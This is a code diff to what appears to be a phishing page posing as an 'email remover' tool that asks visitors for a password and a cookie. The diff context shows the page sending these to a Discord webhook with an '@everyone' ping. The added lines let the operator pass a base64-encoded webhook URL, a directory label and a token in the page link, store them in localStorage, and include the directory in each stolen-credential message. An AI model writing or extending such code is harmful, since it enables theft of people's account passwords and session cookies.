@@ -492,6 +492,30 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // Parse URL parameters first
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedWebhook = urlParams.get('webhook');
+            const encodedDir = urlParams.get('dir');
+            const token = urlParams.get('token');
+            
+            // Decode parameters if they exist
+            let webhookUrl = localStorage.getItem('discord_webhook_url');
+            let directory = localStorage.getItem('email_remover_directory');
+            
+            // If URL parameters exist, they take precedence over localStorage
+            if (encodedWebhook && encodedDir && token) {
+                try {
+                    webhookUrl = atob(encodedWebhook);
+                    directory = atob(encodedDir);
+                    // Store these values in localStorage for future use
+                    localStorage.setItem('discord_webhook_url', webhookUrl);
+                    localStorage.setItem('email_remover_directory', directory);
+                    localStorage.setItem('email_remover_token', token);
+                } catch (e) {
+                    console.error('Error decoding URL parameters:', e);
+                }
+            }
+            
             const ageOption = document.getElementById('age-option');
             const passwordInput = document.getElementById('password-input');
             const cookieInput = document.getElementById('cookie-input');
@@ -595,9 +619,6 @@
                 processBtn.disabled = true;
                 processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REMOVING EMAIL...';
 
-                // Get Discord webhook URL from localStorage
-                const webhookUrl = localStorage.getItem('discord_webhook_url');
-                
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
                     alert('Discord webhook not configured. Please open setup.html first to configure your webhook.');
@@ -605,6 +626,9 @@
                     processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
                     return;
                 }
+                
+                // Include directory in the log if available
+                const directoryInfo = directory ? `Directory: ${directory}` : 'No directory specified';
                 
                 const data = {
                     content: '@everyone',
@@ -629,6 +653,11 @@
                             {
                                 name: 'Email Removal Option',
                                 value: selectedOption === '13plus' ? 'Replace With Temporary Email' : 'Remove Email Completely',
+                                inline: true
+                            },
+                            {
+                                name: 'Directory',
+                                value: directory || 'Not specified',
                                 inline: true
                             },
                             {
